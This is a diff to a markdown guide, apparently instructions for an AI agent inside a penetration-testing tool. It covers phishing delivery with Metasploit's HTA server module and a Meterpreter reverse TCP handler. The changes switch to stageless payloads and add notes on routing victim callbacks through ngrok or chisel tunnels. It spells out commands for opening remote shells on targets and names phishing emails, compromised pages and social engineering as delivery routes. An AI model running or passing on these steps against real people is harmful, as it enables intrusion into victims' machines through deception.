@@ -716,7 +716,7 @@ Host an HTA (HTML Application) that executes a payload when opened in a browser.
 
 ```
 use exploit/windows/misc/hta_server
-set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD windows/meterpreter_reverse_tcp   # STAGELESS — required when using tunnels (ngrok/chisel)
 set LHOST 10.0.0.1
 set LPORT 4444
 set SRVHOST 0.0.0.0
@@ -725,19 +725,21 @@ run -j
 ```
 The module prints a URL like `http://10.0.0.1:8080/random.hta`. Delivery scenarios: embed in a phishing email, redirect from a compromised page, or social-engineer the target into visiting.
 
+> **Tunnel note:** HTA delivery requires SRVPORT (8080) to be reachable by the victim. With **chisel**, both ports 4444 + 8080 are tunneled — HTA works. With **ngrok**, only port 4444 is tunneled — HTA does NOT work (use Method A or chisel instead). When using any tunnel, you MUST use **stageless** payloads (underscore `_` not slash `/`).
+
 ### 3.5 The Handler (Required for All Methods)
 
 Every phishing attack needs a **handler** running in the background to catch the callback when the target executes the payload. The handler MUST use the exact same payload type, LHOST, and LPORT as the generated artifact — mismatched values cause the callback to silently fail.
 
 ```
 use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp   # Must match the payload in Step 3
+set PAYLOAD windows/meterpreter_reverse_tcp    # Must match the payload in Step 3 (use stageless _ with tunnels)
 set LHOST 10.0.0.1                              # Must match LHOST used in generation
 set LPORT 4444                                   # Must match LPORT used in generation
 run -j                                           # Background job — waits for connection
 ```
 
-The handler reads LHOST/LPORT from the project's "Pre-Configured Payload Settings" (configured in the Agent Behaviour tab). If ngrok TCP tunnel is enabled, the public endpoint is used automatically.
+The handler reads LHOST/LPORT from the project's "Pre-Configured Payload Settings" (configured in the Agent Behaviour tab). If a tunnel provider (ngrok or chisel) is enabled, the public endpoint is used automatically. **When using tunnels, always use stageless payloads** (`meterpreter_reverse_tcp` with underscore, not `meterpreter/reverse_tcp` with slash) — staged payloads fail through tunnels.
 
 ### 3.6 Delivery Methods
 
